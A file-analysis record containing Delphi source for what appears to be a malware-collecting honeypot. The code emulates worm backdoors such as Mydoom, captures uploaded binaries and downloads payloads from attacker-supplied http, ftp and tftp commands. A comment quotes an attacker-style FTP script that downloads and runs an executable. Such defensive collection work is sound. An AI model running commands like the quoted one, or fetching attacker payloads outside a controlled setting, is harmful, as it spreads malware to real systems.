{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "CreateThread": "May inject code into another process",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Output": "May write to a file",
            "Windows": "May enumerate application windows",
            "open": "May open a file"
        },
        "macro": "unit untScript;\n\ninterface\n\nuses\n  Windows, Sysutils, Winsock, MD5, Messages,\n  untHTTPDownload, untFTPDownload, untAlert;\n\ntype\n  TInfo = Record\n    dScript: String;\n  End;\n  PInfo = ^TInfo;\n\n  TResp = Record\n    dGet: String;\n    dResp: String;\n    dFirst: Bool;\n  End;\n\n  TScript = Class(TObject)\n  Private\n    dRespond    :Bool;\n    dBBTrans    :Bool;\n    dRespCount  :Integer;\n    dPort       :Integer;\n    dTransfer   :Integer;\n    dName       :String;\n    dVer        :String;\n    dCount      :Integer;\n    sData       :Integer;\n    rData       :Integer;\n\n    Response    :Array[0..100] Of TResp;\n\n    Procedure ReadFileStr(Name: String; Var Output: String);\n    Function  GetParam(dName, dText: String): String;\n    Function  GetResponse(dText: String): TResp;\n    Procedure StartServer(Int: Integer);\n    Procedure ReceiveFile(Int: Integer);\n  Public\n    dScript     :String;\n    Procedure Start;\n  End;\n\n  Var\n    Info  :TInfo;\n    GoOn  :Bool;\n    gSock :TSocket;\n\n  Procedure LoadScript(dName: String);\n  Procedure RunScript(P: Pointer); STDCALL;\n  Function rIP(Sock: TSocket): String;\n\nimplementation\n\nUses\n  untMainForm;\n\nFunction rIP(Sock: TSocket): String;\nVar\n  S     :TSockAddrIn;\n  I     :Integer;\n  W     :TWSAData;\nBegin\n  WSAStartUP($0101, W);\n  I := SizeOf(S);\n  GetPeerName(Sock, S, I);\n  Result := INET_NTOA(S.SIN_ADDR) +':'+ IntToStr(nTohs(S.sin_port));\n  WSACLEANUP;\nEnd;\n\nFunction GrabIncome(Sock: TSocket): Bool;\nVar\n  dTimeOut      :TIMEVAL;\n  dStruct       :TFDSET;\nBegin\n  dTimeOut.tv_sec := 30;\n  dTimeOut.tv_usec := 0;\n  FD_ZERO(dStruct);\n  FD_SET(Sock, dStruct);\n  If (Select(0, @dStruct, nil, nil, @dTimeout) <= 0) Then\n  Begin\n    Result := False;\n    Exit;\n  End;\n  Result := True;\nEnd;\n\nProcedure ReplaceStr(ReplaceWord, WithWord:String; Var Text: String);\nVar\n  xPos: Integer;\nBegin\n  While Pos(ReplaceWord, Text)>0 Do\n  Begin\n    xPos := Pos(ReplaceWord, Text);\n    Delete(Text, xPos, Length(ReplaceWord));\n    Insert(WithWord, Text, xPos);\n  End;\nEnd;\n\nProcedure TScript.ReceiveFile(Int: Integer);\nVar\n  WSA           :TWSAData;\n  Sock          :TSocket;\n  eSock         :TSocket;\n  SockAddr      :TSockAddr;\n  SockAddrIn    :TSockAddrIn;\n  Buffer        :Array[0..1024] Of Char;\n  dErr          :Integer;\n  AddrLen       :Integer;\n  F             :FILE;\n  Data          :String;\n  MalwareName   :String;\n\n  Start         :Integer;\n  Total         :Integer;\n  Speed         :Integer;\nBegin\n    MalwareName := '[' + dName + '.' + dVer + ']-';\n    if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';\n    if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';\n    MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));\n    if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';\n\n    ReplaceStr(':', '-', MalwareName);\n    ReplaceStr('/', '-', MalwareName);\n\n    MalwareName := MalwarePath + MalwareName;\n\n//  Form1.AddLog('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');\n  Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer starting at port ('+IntToStr(Int)+')');\n  WSAStartUp($0101, WSA);\n\n  Sock := Socket(AF_INET, SOCK_STREAM, 0);\n  If (Sock = INVALID_SOCKET) Then Exit;\n\n  FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);\n  SockAddrIn.sin_family := AF_INET;\n  SockAddrIn.sin_port := hTons(Int);\n  SockAddrIn.sin_addr.S_addr := INADDR_ANY;\n\n  If Bind  (Sock, SockAddrIn, SizeOf(SocKAddrIn)) <> 0 Then Exit;\n  If Listen(Sock, SOMAXCONN) <> 0 Then Exit;\n\n  AddrLen := SizeOf(SockAddr);\n  While TRUE Do\n  Begin\n    eSock := Accept(Sock, @SockAddr, @AddrLen);\n    If (eSock = INVALID_SOCKET) Then Exit;\n\n    Form1.AddLog('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': File-transfer started at port ('+IntToStr(Int)+') from ('+rIP(eSock)+')');\n    Inc(REMOTE_CONNECTIONS);\n    Form1.AddCount(dName, dVer);\n\n    ZeroMemory(@Buffer, SizeOf(Buffer));\n\n    If (dCount > 0) Then\n    Begin\n      Inc(dCount);\n\n      If (Response[dCount].dFirst) Then\n      Begin\n        Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);\n        INC(DATA_SENT, Length(Response[dCount].dResp));\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        If (Not GrabIncome(eSock)) Then Exit;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End Else\n      Begin\n        If (Not GrabIncome(eSock)) Then Exit;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);\n        If (Response[dCount].dGet = String(Buffer)) Then\n        Begin\n          Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);\n          INC(DATA_SENT, Length(Response[dCount].dResp));\n          Inc(sData, Length(Response[dCount].dResp));\n          Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        End;\n      End;\n    End;\n\n    Start := GetTickCount;\n    Total := 1;\n\n    Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');\n    Form1.Memo4.Lines.Add('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');\n    AssignFile(F, MalwareName);\n    ReWrite(F, 1);\n    Repeat\n      If (Not GrabIncome(eSock)) Then Exit;\n      dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n      If dErr <= 0 Then\n        Break;\n      Inc(rData, dErr);\n      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      Total := Total + dErr;\n      BlockWrite(F, Buffer, dErr);\n      INC(DATA_RECEIVED, dErr);\n      ZeroMemory(@Buffer, SizeOf(Buffer));\n      If (dBBTrans) Then\n      Begin\n        Data := '*';\n        Send(eSock, Data[1], length(Data), 0);\n        INC(DATA_SENT, Length(Data));\n        Inc(sData, Length(Data));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End;\n    Until eSock = INVALID_SOCKET;\n    CloseFile(F);\n    Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);\n    If (Speed > RECEIVE_SPEED) Then\n      RECEIVE_SPEED := Speed;\n      \n    If (Total <= 0) Then\n      If (Form1.CheckBox2.Checked) Then\n        DeleteFile(pChar(MalwareName));\n\n    If (dCount > 0) Then\n    Begin\n      Inc(dCount);\n\n      If (Response[dCount].dFirst) Then\n      Begin\n        Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        INC(DATA_SENT, Length(Response[dCount].dResp));\n        If (Not GrabIncome(eSock)) Then Exit;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End Else\n      Begin\n        If (Not GrabIncome(eSock)) Then Exit;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        If (Response[dCount].dGet = '*') Then Response[dCount].dGet := String(Buffer);\n        If (Response[dCount].dGet = String(Buffer)) Then\n        Begin\n          Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0);\n          INC(DATA_SENT, Length(Response[dCount].dResp));\n          Inc(sData, Length(Response[dCount].dResp));\n          Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        End;\n      End;\n    End;\n    Form1.AddLog('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Received file from ('+rIP(eSock)+')');\n\n    CloseSocket(eSock);\n  End;\n  CloseSocket( Sock);\n  WSACleanUP;\nEnd;\n\nFunction IsNumeric(Str : String): Bool;\nVar\n  I: Integer;\n  N: String;\nBegin\n  Result := True;\n  N := '0123456789';\n  For I := 1 To Length(Str) Do\n    If (Pos(Str[I], N) = 0) Then Result := False;\nEnd;\n\nProcedure TScript.StartServer(Int: Integer);\nVar\n  WSA           :TWSAData;\n  eSock         :TSocket;\n  Sock          :TSocket;\n  SockAddr      :TSockAddr;\n  SockAddrIn    :TSockAddrIn;\n  Buffer        :Array[0..1024] Of Char;\n  wBuffer       :Array[0..1024] Of Char;\n  Data          :AnsiString;\n  CountDown     :Integer;\n  AddrLen       :Integer;\n  F             :FILE;\n  dErr          :Integer;\n  dLen          :Integer;\n  U             :Integer;\n  I             :Integer;\n  FTPUser       :String;\n  FTPPort       :String;\n  FTPFile       :String;\n  FTPName       :String;\n  FTPPass       :String;\n  MalwareName   :String;\n\n  Start         :Integer;\n  Total         :Integer;\n  Speed         :Integer;\n\n  AlertThread   :DWord;\nLabel\n  GoBack, HurryTransfer, HurryATransfer, ListenForMore, CloseRemote;\nBegin\n  Sleep(500);\n  Sock := INVALID_SOCKET;\n//  Form1.AddLog('@'+dName+'.'+dVer+': Starting server at port ('+IntToStr(Int)+')');\nGoBack:\n  If (Sock <> INVALID_SOCKET) Then\n  Begin\n    CloseSocket(Sock);\n    WSACleanUP;\n  End;\n\n  WSAStartUp($0101, WSA);\n\n  Sock := Socket(AF_INET, SOCK_STREAM, 0);\n  If (Sock = INVALID_SOCKET) Then Goto GoBack;\n\n  FillChar(SockAddrIn, SizeOf(SockAddrIn), 0);\n  SockAddrIn.sin_family := AF_INET;\n  SockAddrIn.sin_port := hTons(Int);\n  SockAddrIn.sin_addr.S_addr := INADDR_ANY;\n\n  Form1.SetSocket(1, dName, dVer, INVALID_SOCKET);\n  Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);\n  If Bind(Sock, SockAddrIn, SizeOf(SockAddrIn)) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Exit; End;\n  If Listen(Sock, SOMAXCONN) <> 0 Then Begin INC(SCRIPT_FAILED); Form1.AddErr(dName, dVer); Goto GoBack; End;\n  Form1.SetSocket(1, dName, dVer, Sock);\n  Form1.SetSocket(2, dName, dVer, INVALID_SOCKET);\n\n  Form1.AddLog('@'+dName+'.'+dVer+': Server successfully started, waiting for connnections');\n\n  AddrLen := SizeOf(SockAddr);\n  While TRUE Do\n  Begin\n    eSock := Accept(Sock, @SockAddr, @AddrLen);\n    If (eSock = INVALID_SOCKET) Then Begin INC(EXPLOIT_FAILURE); Goto GoBack; End;\n\n    rData := 0;\n    sData := 0;\n\n    If (Form1.Visible = False) Then\n      CreateThread(NIL, 0, @DoAlert, NIL, 0, AlertThread);\n\n    Form1.SetSocket(1, dName, dVer, Sock);\n    Form1.SetSocket(2, dName, dVer, eSock);\n    // Someone connected.\n    Form1.AddLog('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Connection established from ('+rIP(eSock)+')');\n    Inc(REMOTE_CONNECTIONS);\n    Form1.AddVisitor(rIP(eSock), dName+'.'+dVer);\n    Form1.AddCount(dName, dVer);\n\n    MalwareName := '[' + dName + '.' + dVer + ']-';\n    if (Form1.CheckBox4.Checked) Then MalwareName := MalwareName + TimeToStr(Now) + '_' + DateToStr(Now) + '-';\n    if (Form1.ChecKBox5.Checked) Then Malwarename := MalwareName + Copy(rIP(eSock), 1, Pos(':', rIP(eSock))-1)+'-';\n    MalwareName := MalwareName + MD5Print(MD5String(TimeToStr(Now)+dName+dVer+DateToStr(Now)));\n    if (Form1.CheckBox3.Checked) Then MalwareName := MalwareName + '.bin' Else MalwareName := MalwareName + '.exe';\n\n    ReplaceStr(':', '-', MalwareName);\n    ReplaceStr('/', '-', MalwareName);\n\n    MalwareName := MalwarePath + MalwareName;\n\n    // now lets talk with this foo.\n    CountDown := dRespCount;\n    dCount := 0;\n\n    If (CountDown > 0) Then\n    Repeat\n      If (Response[dCount].dFirst) Then\n      Begin\n        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;\n\n        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;\n        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n//        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;\n      End Else\n      Begin\n        If (Not GrabIncome(eSock)) Then Goto ListenForMore;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        If (dErr < 0) Then Break;\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;\n\n        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;\n        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End;\n\n      Inc(DATA_SENT, Length(Response[dCount].dResp));\n      Inc(DATA_RECEIVED, Length(String(Buffer)));\n\n      If (String(Buffer) <> '') Then\n        Form1.AddIncome(rIP(eSock), String(Buffer)); \n        //Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));\n      ZeroMemory(@Buffer, SizeOf(Buffer));\n\n        If (Response[dCount].dResp = '[transfer]')  And (dPort =  dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '[transfer]')  And (dPort <> dTransfer) Then Goto HurryATransfer;\n\n        If (Response[dCount].dResp = '*[transfer]') And (dPort = dTransfer) Then Goto HurryTransfer;\n        If (Response[dCount].dResp = '*[transfer]') And (dPort <> dTransfer) Then Goto HurryATransfer;\n\n      Inc(dCount);\n      Dec(CountDown);\n\n      If (CountDown = 0) Then Goto ListenForMore;\n    Until CountDown < 0;\n\n    // If you came here, then somethere went wrong\n    Goto ListenForMore;\n\n    // HurryTransfer !\nHurryTransfer:\n    Form1.AddLog('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': Starting a transfer on same port ('+IntToStr(dPort)+') with ('+rIP(eSock)+')');\n    If (dPort = dTransfer) Then\n    Begin\n      If (Response[dCount].dResp = '*[transfer]') Then\n      Begin\n        Data := '_';\n        Send(eSock, Data[1], Length(Data), 0);\n        Inc(sData, Length(Data));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        Inc(DATA_SENT, Length(Data));\n        Inc(dCount);\n      End;\n\n      Start := GetTickCount;\n      Total := 1;\n\n      AssignFile(F, MalwareName);\n      Rewrite(F, 1);\n\n      dLen := 0;\n      U := 0;\n      If (dName = 'Mydoom') Then\n      Begin\n        Repeat\n          If (Not GrabIncome(eSock)) Then\n          Begin\n            CloseFile(F);\n            Goto CloseRemote;\n          End;\n          dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n          If (Buffer[U] <> 'M') And (dLen = 0) Then\n          Begin\n            U := 0;\n            Repeat Inc(U); Until (Buffer[U] = 'M') Or (U > 20);\n            If (U < 20) Then\n            Begin\n              Move(Buffer[U], wBuffer[0], SizeOf(Buffer)-U);\n              If (dErr > 0) Then BlocKWrite(F, wBuffer, dErr);\n            End;\n            Inc(dLen);\n          End Else\n            If (dErr > 0) Then BlocKWrite(F, Buffer, dErr);\n          FillChar(Buffer, SizeOf(Buffer), 0);\n          FillChar(wBuffer, SizeOf(wBuffer), 0);\n        Until dErr <= 0;\n        dLen := 0;\n      End Else\n      Begin\n        Repeat\n          FillChar(Buffer, SizeOf(Buffer), 0);\n          If (Not GrabIncome(eSock)) Then\n          Begin\n            CloseFile(F);\n            Goto CloseRemote;\n          End;\n          dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n          If (dErr > 0) Then\n            BlockWrite(F, Buffer, dErr);\n          If (dBBTrans) Then\n          Begin\n            Data := '*';\n            Send(eSock, Data[1], length(Data), 0);\n            INC(DATA_SENT, Length(Data));\n            Inc(sData, Length(Data));\n            Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n          End;\n        Until dErr <= 0;\n      End;\n\n      Total := FileSize(F);\n      CloseFile(F);\n      If (Total <= 0) Then\n        If (Form1.CheckBox2.Checked) Then\n          DeleteFile(pChar(MalwareName));\n      Inc(rData, Total);\n      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      Inc(Data_Received, Total);\n      Form1.AddLog('@'+dName+'.'+dVer+': Creating file ('+MalwareName+')');\n      Form1.Memo4.Lines.Add('Created '+MalwareName);\n\n      Speed := Total DIV (((GetTickCount - Start) DIV 1000) + 1);\n      If (Speed > RECEIVE_SPEED) Then\n        RECEIVE_SPEED := Speed;\n\n    End;\n    Goto ListenForMore;\n\nHurryATransfer:\n    Form1.AddLog('@'+dName+'.'+dVer+': Starting transfer on additional port ('+IntToStr(dTransfer)+') from ('+rIP(eSock)+')');\n    If (dTransfer > 0) and (dPort <> dTransfer) Then\n    Begin\n      If (Response[dCount].dResp = '*[transfer]') Then\n      Begin\n        Data := '_';\n        Send(eSock, Data[1], Length(Data), 0);\n        Inc(DATA_SENT, Length(Data));\n        Inc(dCount);\n        Inc(sData, Length(Data));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End;\n\n      ReceiveFile(dTransfer);\n    End;\n    Goto ListenForMore;\n\nListenForMore:\n    Form1.AddLog('@'+dName+'.'+dVer+': Waiting for receive data from '+rIP(eSock));\n    If (CountDown > 0) Then\n    Repeat\n      If (Response[dCount].dFirst) Then\n      Begin\n        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n//        If (Recv(eSock, Buffer, SizeOf(Buffer), 0) < 0) Then Break;\n      End Else\n      Begin\n        If (Not GrabIncome(eSock)) Then Goto CloseRemote;\n        dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n        If (dErr < 0) Then Break;\n        Inc(rData, dErr);\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n        If (Send(eSock, Response[dCount].dResp[1], Length(Response[dCount].dResp), 0) < 0) Then Break;\n        Inc(sData, Length(Response[dCount].dResp));\n        Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n      End;\n\n      Inc(DATA_SENT, Length(Response[dCount].dResp));\n      Inc(DATA_RECEIVED, Length(String(Buffer)));\n\n      If (String(Buffer) <> '') Then\n        Form1.AddIncome(rIP(eSock), String(Buffer));\n//        Form1.Memo1.Lines.Add('['+TimeToStr(Now)+' RECV '+rIP(eSock)+']'+String(Buffer));\n      ZeroMemory(@Buffer, SizeOf(Buffer));\n\n      Inc(dCount);\n      Dec(CountDown);\n      If (CountDown < 0) Then Break;\n    Until CountDown < 0;\n\n    Repeat\n      ZeroMemory(@Buffer, SizeOf(Buffer));\n      If (Not GrabIncome(eSock)) Then Goto CloseRemote;\n      dErr := Recv(eSock, Buffer, SizeOf(Buffer), 0);\n      Data := String(Buffer);\n      Inc(DATA_RECEIVED, Length(Data));\n      Inc(rData, dErr);\n      Form1.UpdateVisitor(rIP(eSock), dName+'.'+dVer, sData, rData);\n\n      If (Data <> '') Then\n        Form1.AddIncome(rIP(eSock), Data);\n\n      (* http://domain.com/file.exe *)\n      If (LowerCase(Copy(Data, 1, 4)) = 'http') Then\n      Begin\n        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from HTTP ('+Data+')');\n        DownloadFileFromURL(Data, MalwareName);\n        Form1.Memo4.Lines.Add('Created '+ MalwareName);\n      End;\n\n      (* ftp://user:pass@domain:port/file.exe *)\n      If (LowerCase(Copy(Data, 1, 3)) = 'ftp') Then\n      Begin\n        Delete(Data, 1, 6);\n          FTPUser := Copy(Data, 1, Pos(':', Data)-1);\n        Delete(Data, 1, Pos(':', Data));\n          FTPPass := Copy(Data, 1, Pos('@', Data)-1);\n        Delete(Data, 1, Pos('@', Data));\n          FTPName := Copy(Data, 1, Pos(':', Data)-1);\n        Delete(Data, 1, Pos(':', Data));\n          FTPPort := Copy(Data, 1, Pos('/', Data)-1);\n        Delete(Data, 1, Pos('/', Data));\n          FTPFile := Data;\n        If (pos(' ', FTPFile) > 0) Then Delete(FTPFile, Pos(' ', FTPFile), Length(FTPFile));\n        If (pos(#10, FTPFile) > 0) Then Delete(FTPFile, Pos(#10, FTPFile), Length(FTPFile));\n        If (pos(#13, FTPFile) > 0) Then Delete(FTPFile, Pos(#13, FTPFile), Length(FTPFile));\n\n        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPUser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' : '+FTPFile+')');\n\n        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+\n        'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);\n\n        DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));\n      End;\n\n      (* tftp -i domain file.exe *)\n      If (LowerCase(Copy(Data, 1, 4)) = 'tftp') Then\n      Begin\n        FTPName := Copy(Data, Pos('-i', Data)+3, Length(Data));\n        FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);\n\n        FTPFile := Copy(Data, Pos('GET', UpperCase(Data)) + 4, Length(Data));\n\n        If (FTPFile[Length(FTPFile)] = #10) then Delete(FTPFile, Length(FTPFile), 1);\n\n        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from TFTP ('+FTPName+' : '+FTPFile+')');\n        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']Connecting to '+FTPName+':69 > '+FTPFile);\n\n        DownloadFileFromFTP('', '', FTPName+'/'+FTPFile, MalwareName, 69);\n      End;\n\n      (* echo open domain port ? echo user ? echo pass ? echo get file.exe ? echo bye ? *)\n      If (LowerCase(Copy(Data, 1, 9)) = 'echo open') Then\n      Begin\n        (*\n          echo open 127.0.0.1 1234>>o&\n          echo h>>o&\n          echo h>>o&\n          echo get cool.exe>>o&\n          echo bye>>o&\n          ftp -n -s:o&\n          cool.exe&\n          del o&\n          exit\n        *)\n\n        // the host\n        FTPName := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));\n        FTPName := Copy(FTPName, 1, Pos(' ', FTPName)-1);\n\n        // the port\n        FTPPort := Copy(Data, Pos('open', LowerCase(Data))+5, Length(Data));\n        FTPPort := Copy(FTPPort, Pos(' ', FTPPort)+1, Length(FTPPort));\n        If (Pos(' ', FTPPort) > Pos('>>', FTPPort)) Then\n          FTPPort := Copy(FTPPort, 1, Pos('>>', FTPPort)-1)\n        Else If (Pos(' ', FTPPort) < Pos('>>', FTPPort)) Then\n          FTPPort := Copy(FTPPort, 1, Pos(' ', FTPPort)-1);\n        For I := 1 To Length(FTPPort) Do\n          If (Not IsNumeric(FTPPort[i])) Then\n          Begin\n            Delete(FTPPort, I, Length(FTPPort));\n            Break;\n          End;\n\n        // the file\n        FTPFile := Copy(Data, Pos('get', LowerCase(Data))+4, Length(Data));\n        FTPFile := Copy(FTPFile, 1, Pos('.', FTPFile)+3);\n\n        // the user\n        FTPUser := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));\n        FTPUser := Copy(FTPUser, Pos('echo', LowerCase(FTPUser))+4, Length(FTPUser));\n        FTPUser := Copy(FTPUser, 1, Pos('>>', FTPUser)-1);\n\n        // the pass\n        FTPPass := Copy(Data, Pos('echo', LowerCase(Data))+4, Length(Data));\n        FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));\n        FTPPass := Copy(FTPPass, Pos('echo', LowerCase(FTPPass))+4, Length(FTPPass));\n        FTPPass := Copy(FTPPass, 1, Pos('>>', FTPPass)-1);\n\n        FTPName := Trim(FTPName);\n        FTPPort := Trim(FTPPort);\n        FTPFile := Trim(FTPFile);\n        FTPUser := Trim(FTPUser);\n        FTPPass := Trim(FTPPass);\n\n        Form1.AddLog('@'+dName+'.'+dVer+': Downloading file from FTP ('+FTPuser+':'+FTPPass+' @ '+FTPName+':'+FTPPort+' '+FTPFile+')');\n        Form1.Memo2.Lines.Add('['+TimeToStr(Now)+' FTP '+rIP(eSock)+']'+\n        'Connecting to '+FTPName+':'+FTPPort+'/'+FTPFile+' User:'+FTPUser+' Pass:'+FTPPass);\n\n        DownloadFileFromFTP(FTPUser, FTPPass, FTPName+'/'+FTPFile, MalwareName, StrToInt(FTPPort));\n      End;\n    Until dErr <= 0;\n\n    Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');\n    Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);\n    Sleep(1000);\n    CloseSocket(eSock);\n\n    rData := 0;\n    sData := 0;\n  End;\n\nCloseRemote:\n  If (eSock <> INVALID_SOCKET) Then\n  Begin\n    Form1.AddLog('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');\n    Form1.Memo1.Lines.Add('@'+dName+'.'+dVer+': User disconnected ('+rIP(eSock)+')');\n    Form1.DeleteVisitor(rIP(eSock), dName+'.'+dVer);\n    rData := 0;\n    sData := 0;\n  End;\n\n  CloseSocket(Sock);\n  WSACleanUP;\n\n  INC(EXPLOIT_SUCCESS);\nGoto GoBack;\nEnd;\n\nFunction TScript.GetParam(dName, dText: String): String;\nVar\n  P: Integer;\nBegin\n  P := Pos( LowerCase(dName), LowerCase(dText) );\n  If (P > 0) Then\n  Begin\n    Result := Copy(dText, P+1, length(dText));\n    Result := Copy(Result, 1, Pos(#13, Result)-1);\n    Result := Trim(Copy(Result, Pos(':', Result)+1, Length(Result)));\n    If LowerCase(Result) = 'yes' Then Result := '1';\n    If LowerCase(Result) = 'no' Then Result := '0';\n    Result := Trim(Result);\n  End;\nEnd;\n\nFunction TScript.GetResponse(dText: String): TResp;\nVar\n  I     :Integer;\n  Tmp   :String;\nBegin\n  Result.dGet := '';\n  Result.dResp := '';\n\n  If (dText[1] <> '\"') Then Exit;\n\n  Delete(dText,1,1);\n  Result.dGet := Copy(dText, 1, Pos('\"', dText)-1);\n  Delete(dText, 1, Pos('\"', dText));\n  Delete(dText, 1, pos('\"', dText));\n  Result.dResp := Copy(dText, 1, Pos('\"', dText)-1);\n\n  Tmp := Copy(dText, Pos('\"', dText)+1, Length(dText));\n  Tmp := Trim(Tmp);\n\n  Result.dFirst := False;\n  If (Tmp = 'nf') Then\n    Result.dFirst := False;\n  If (Tmp = 'f') Then\n    Result.dFirst := True;\nEnd;\n\nProcedure TScript.Start;\nVar\n  Data  :String;\n  Resp  :TResp;\n  Temp  :String;\n  I     :Integer;\n  C     :Integer;\nBegin\n  If Not FileExists(dScript) Then Exit;\n  ReadFileStr(dScript, Data);\n\n  FillChar(Response, SizeOf(Response), 0);\n\n  dBBTrans := False;\n  If GetParam('bounceback-transfer', Data) <> '' Then\n    dBBTrans      := Boolean(StrToInt(GetParam('bounceback-transfer', Data)));\n\n  dRespond := False;\n  If GetParam('response', Data) <> '' Then\n    dRespond      := Boolean(StrToInt(GetParam('response', Data)));\n\n  If GetParam('port', Data) <> '' Then\n    dPort         := StrToInt(GetParam('port', Data));\n\n  If (GetParam('transferport', Data) <> '') Then\n    dTransfer     := 